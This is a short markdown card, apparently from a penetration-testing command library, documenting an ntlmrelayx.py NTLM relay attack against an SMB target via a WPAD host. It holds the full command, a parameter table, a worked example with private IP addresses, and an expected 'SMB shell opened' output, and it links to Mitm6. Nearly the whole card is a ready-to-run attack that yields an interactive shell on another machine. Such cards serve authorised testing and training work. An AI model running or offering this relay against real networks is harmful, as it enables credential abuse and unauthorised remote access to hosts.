---
type: command
executor: bash
data: 'ntlmrelayx.py -wh $_WPAD_HOST -t smb://$_TARGET/ -i'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - ntlm
  - relay
verified: true
validated: true
---

# ntlmrelayx-smb-relay

## Command

```bash
ntlmrelayx.py -wh $_WPAD_HOST -t smb://$_TARGET/ -i
```

## Description

Relays NTLM to SMB target with interactive shell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -wh $_WPAD_HOST | WPAD host IP | Yes |
| -t smb://$_TARGET/ | SMB target | Yes |
| -i | Interactive shell | Yes |

## Examples

### Basic Usage

```bash
ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
```

## Expected Output

Relayed shell: "SMB shell opened".

## Related

- [[tools/Mitm6]]
